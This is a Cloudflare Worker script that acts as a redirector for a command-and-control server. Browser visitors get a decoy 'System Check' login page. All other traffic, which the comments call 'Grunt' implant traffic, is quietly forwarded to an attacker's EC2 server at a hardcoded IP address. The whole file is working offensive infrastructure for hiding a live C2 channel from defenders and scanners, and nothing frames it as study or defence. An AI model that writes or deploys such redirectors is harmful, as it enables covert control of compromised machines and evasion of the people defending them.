export default {
    async fetch(request) {
        const url = new URL(request.url);
        const userAgent = request.headers.get("User-Agent") || "";

        // --- 1. Check if it's a normal browser ---
        const isBrowser = /Chrome|Firefox|Safari|MSIE|Edge|Opera|Brave/i.test(userAgent);

        if (isBrowser) {
            // --- If Browser: Show the Fake Login Page ---
            const html = `<!DOCTYPE html>
            <html>
            <head>
                <title>System Check | Please Log In</title>
                <style>
                    body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
                    .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 300px; }
                    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
                    button { width: 100%; background: #1877f2; color: white; border: none; padding: 10px; border-radius: 4px; cursor: pointer; }
                </style>
            </head>
            <body>
                <div class="box">
                    <h2>Access Restricted</h2>
                    <p>Please verify your credentials to continue.</p>
                    <form>
                        <input type="text" placeholder="Username" />
                        <input type="password" placeholder="Password" />
                        <button>Continue</button>
                    </form>
                </div>
            </body>
            </html>`;
            return new Response(html, { headers: { "Content-Type": "text/html" } });
        }

        // --- 2. If NOT a Browser (It's a Grunt): Forward to your EC2 C2 ---
        // ⚠️ IMPORTANT: CHANGE 'YOUR_EC2_IP' to your real AWS Public IP (e.g., 18.207.141.xx)
        const backendUrl = `http://18.207.141.118:9000${url.pathname}${url.search}`;
        
        // Forward the request exactly as received
        return fetch(backendUrl, request);
    }
};